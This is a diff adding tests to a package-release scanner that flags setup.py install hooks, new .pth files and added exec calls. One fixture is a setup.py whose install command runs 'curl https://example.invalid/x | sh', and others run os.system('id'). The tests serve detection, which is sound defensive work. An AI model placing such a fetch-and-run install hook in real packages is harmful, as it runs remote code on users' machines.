@@ -1,7 +1,7 @@
 from dataclasses import replace
 
 from garnet_guard.engine import run_checks
-from garnet_guard.models import Change, FactError, Severity, TagInfo, Verdict
+from garnet_guard.models import Change, FactError, ReleaseFacts, Severity, TagInfo, Verdict
 from tests.builders import prov, release
 
 CHANGE = Change("pypi", "demo", "1.0", "1.1")
@@ -272,3 +272,115 @@ def test_base64_into_existing_exec_fires() -> None:
     assert f.rule_id == "GRN-C003"
     assert "base64.b64decode → exec" in f.evidence[0].summary
     assert "GRN-C003" not in rules(base, release("1.1", {"demo/__init__.py": old + "Y = 2\n"}))
+
+
+# GRN-C002: setup.py anywhere, and releases without a trusted sdist
+SETUP = "from setuptools import setup\nsetup(name='demo')\n"
+SETUP_HOOK = (
+    "import os\nfrom setuptools import setup\nfrom setuptools.command.install import install\n\n"
+    "class PostInstall(install):\n    def run(self):\n        install.run(self)\n"
+    "        os.system('curl https://example.invalid/x | sh')\n\n"
+    "setup(name='demo', cmdclass={'install': PostInstall})\n"
+)
+SRC = {"demo/__init__.py": INIT, "setup.py": SETUP}
+
+
+def _sdist(version: str, files: dict[str, str]) -> ReleaseFacts:
+    return release(version, sdist_files=files, sdist_only=True)
+
+
+def test_setup_py_install_hook_fires() -> None:
+    # The classic shape: a cmdclass whose run() fetches and executes something.
+    result = run_checks(CHANGE, _sdist("1.0", SRC), _sdist("1.1", {**SRC, "setup.py": SETUP_HOOK}))
+    [f] = [f for f in result.findings if f.rule_id == "GRN-C002"]
+    assert "setup.py:8 calls os.system (in PostInstall.run())" in f.evidence[0].summary
+
+
+def test_sdist_only_release_after_wheel_only_is_still_compared() -> None:
+    base = release("1.0", {"demo/__init__.py": INIT})
+    cand = _sdist(
+        "1.1", {"demo/__init__.py": INIT + "import os\nos.system('id')\n", "setup.py": SETUP_HOOK}
+    )
+    result = run_checks(CHANGE, base, cand)
+    ids = {f.rule_id for f in result.findings}
+    assert {"GRN-C002", "GRN-C003"} <= ids
+    [c003] = [f for f in result.findings if f.rule_id == "GRN-C003"]
+    assert "different kinds of files" in c003.evidence[-1].summary
+
+
+def test_setup_py_in_a_release_that_adds_an_sdist_counts_as_new() -> None:
+    base = release("1.0", {"demo/__init__.py": INIT})
+    cand = release("1.1", {"demo/__init__.py": INIT}, sdist_files={**SRC, "setup.py": SETUP_HOOK})
+    assert "GRN-C002" in rules(base, cand)
+    # Not when the trusted sdist exists but couldn't be read: that is GRN-E001's job.
+    base_unread = release("1.0", {"demo/__init__.py": INIT}, sdist_files=None)
+    base_unread = replace(
+        base_unread,
+        artifacts=base_unread.artifacts
+        + release("1.0", sdist_files={}, sdist_only=True).artifacts[:1],
+    )
+    unread = replace(base_unread.artifacts[1], inspected=False)
+    base_unread = replace(base_unread, artifacts=(base_unread.artifacts[0], unread))
+    assert "GRN-C002" not in rules(base_unread, cand)
+
+
+def test_unchanged_setup_py_hook_is_quiet() -> None:
+    assert "GRN-C002" not in rules(
+        _sdist("1.0", {**SRC, "setup.py": SETUP_HOOK}),
+        _sdist("1.1", {**SRC, "setup.py": SETUP_HOOK}),
+    )
+
+
+# GRN-C001: where a .pth lands
+def test_pth_under_the_versioned_data_folder_is_the_same_file() -> None:
+    base = release(
+        "1.0", {"demo/__init__.py": INIT, "demo-1.0.data/purelib/demo.pth": "import demo\n"}
+    )
+    cand = release(
+        "1.1", {"demo/__init__.py": INIT, "demo-1.1.data/purelib/demo.pth": "import demo\n"}
+    )
+    assert "GRN-C001" not in rules(base, cand)
+    gained = release(
+        "1.1",
+        {
+            "demo/__init__.py": INIT,
+            "demo-1.1.data/purelib/demo.pth": "import demo\nimport demo._boot\n",
+        },
+    )
+    assert "GRN-C001" in rules(base, gained)
+
+
+def test_pth_outside_site_packages_root_never_runs() -> None:
+    base = release("1.0", {"demo/__init__.py": INIT})
+    nested = release("1.1", {"demo/__init__.py": INIT, "demo/data/x.pth": "import os\n"})
+    scripts = release(
+        "1.1", {"demo/__init__.py": INIT, "demo-1.1.data/scripts/x.pth": "import os\n"}
+    )
+    assert "GRN-C001" not in rules(base, nested)
+    assert "GRN-C001" not in rules(base, scripts)
+    assert "GRN-C001" in rules(
+        base,
+        release("1.1", {"demo/__init__.py": INIT, "demo-1.1.data/platlib/x.pth": "import os\n"}),
+    )
+
+
+def test_renamed_pth_with_the_same_lines_is_quiet() -> None:
+    line = "import sys, types, os; p = os.path.join(sys._getframe(1).f_locals['sitedir'], 'demo')\n"
+    base = release("1.0", {"demo/__init__.py": INIT, "demo-1.0-py3.9-nspkg.pth": line})
+    assert "GRN-C001" not in rules(
+        base, release("1.1", {"demo/__init__.py": INIT, "demo-1.1-py3.9-nspkg.pth": line})
+    )
+    assert "GRN-C001" in rules(
+        base,
+        release(
+            "1.1",
+            {"demo/__init__.py": INIT, "demo-1.1-py3.9-nspkg.pth": line + "import demo._boot\n"},
+        ),
+    )
+
+
+def test_modules_under_purelib_keep_their_names_across_versions() -> None:
+    mod = "import os\nos.system('id')\n"
+    base = release("1.0", {"demo-1.0.data/purelib/demo/__init__.py": mod})
+    cand = release("1.1", {"demo-1.1.data/purelib/demo/__init__.py": mod + "X = 1\n"})
+    assert "GRN-C003" not in rules(base, cand)
